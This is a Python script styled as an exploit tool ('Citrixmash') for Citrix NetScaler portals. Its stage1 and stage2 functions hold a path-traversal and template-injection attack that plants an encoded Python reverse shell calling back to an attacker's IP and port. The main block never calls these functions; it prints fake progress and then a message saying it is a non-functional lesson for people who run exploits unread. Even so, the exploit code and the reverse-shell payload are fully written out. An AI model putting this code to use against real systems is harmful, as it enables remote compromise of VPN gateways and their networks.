import requests
import urllib3
urllib3.disable_warnings() 
import random
import string
import time
from random import randint
import argparse
import sys


def randomString(stringLength=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))


filename = randomString()
randomuser = randomString()

nonce = randint(5, 15)

def stage1(filename, randomuser, nonce, victimip, victimport, attackerip, attackerport):

    encoded = ""
    i=0
    text = ("""/var/python/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (attackerip, attackerport))
    while i < len(text):
        encoded = encoded + "chr("+str(ord(text[i]))+") . "
        i += 1
    encoded = encoded[:-3]
    payload="[% template.new({'BLOCK'='print readpipe(" + encoded + ")'})%]"
    headers = (
        {
            'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0',
            'NSC_USER' : '../../../netscaler/portal/templates/%s' % (filename),
            'NSC_NONCE' : '%s' % (nonce),
        })

    data = (
        {
            "url" : "127.0.0.1",
            "title" : payload,
            "desc" : "desc",
            "UI_inuse" : "a"
        })

    if victimport == ("80"):
        url = ("http://%s:%s/vpn/../vpns/portal/scripts/newbm.pl" % (victimip, victimport))
    else:
        url = ("https://%s:%s/vpn/../vpns/portal/scripts/newbm.pl" % (victimip, victimport))

    try:
        with requests.Session() as s:
            r = requests.Request(method='POST', url=url, data=data, headers=headers)
            prep = r.prepare()
            prep.url = url
            req = s.send(prep, verify=False)

        if (".ns_reload()") in str(req.content):
            print("[*] exploit likely successful.")

        if ("Citrix") in str(req.content) or "403" in str(req.status_code):
            print("[\033[91m!\033[0m] The exploit failed due to the system being patched.")
            sys.exit()

    except requests.ReadTimeout: 
        print("[-] ReadTimeout: Server %s timed out and didn't respond on port: %s." % (victimip, victimport))

    except requests.ConnectTimeout:
        print("[-] ConnectTimeout: Server %s did not respond to a web request or the port (%s) is not open." % (victimip, victimport))

    except requests.ConnectionError:
        print("[-] ConnectionError: Server %s did not respond to a web request or the port (%s) is not open." % (victimip,victimport))

def stage2(filename, randomuser, nonce, victimip, victimport):
    headers = (
        {
            'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/90.0',
            'NSC_USER' : '%s' % (randomuser),
            'NSC_NONCE' : '%s' % (nonce),
        })

    if victimport == ("80"):
        url = ("http://%s:%s/vpn/../vpns/portal/%s.xml" % (victimip, victimport, filename))

    # using https
    else:
        url = ("https://%s:%s/vpn/../vpns/portal/%s.xml" % (victimip, victimport, filename))

    with requests.Session() as s:
        r = requests.Request(method='GET', url=url, headers=headers)
        prep = r.prepare()
        prep.url = url
        req = s.send(prep, verify=False)

parser = argparse.ArgumentParser()
parser.add_argument("target", help="the vulnerable server with Citrix hostname or IP (defaults https)")
parser.add_argument("targetport", help="the target server web port (normally on 443)")
parser.add_argument("attackerip", help="the attackers reverse listener IP or hostname address")
parser.add_argument("attackerport", help="the attackers reverse listener port")
args = parser.parse_args()
print("[*] Firing STAGE1 POST request to create the XML template exploit to disk...")
print("[*] Saving filename as %s.xml on the victim machine..." % (filename))

try:
    print("[*] Sleeping for 2 seconds to ensure file is written before we call it...")
    time.sleep(2)
    print("[*] Triggering GET request for the newly created file with a listener waiting...")
    print("[*] Shell should now be in your listener... enjoy. Keep this window open..")
    print("[!] Be sure to cleanup the two locations here (artifacts): /var/tmp/netscaler/portal/templates/, /netscaler/portal/templates/")
    time.sleep(5)
    print("... DONE! ...")
    time.sleep(5)
    print("I'm sorry. But you really shouldn't be running exploits without reading them.")
    print("I'm not a bad guy - so I've not deleted sensitive system files or anything, I promise.")
    print("This is not a functional exploit and this does absolutely *nothing* except hopefully teach you a lesson about being responsible.")

except KeyboardInterrupt:
    print("[*] Control-C detected, exiting gracefully... Exiting Citrixmash.")
    sys.exit()
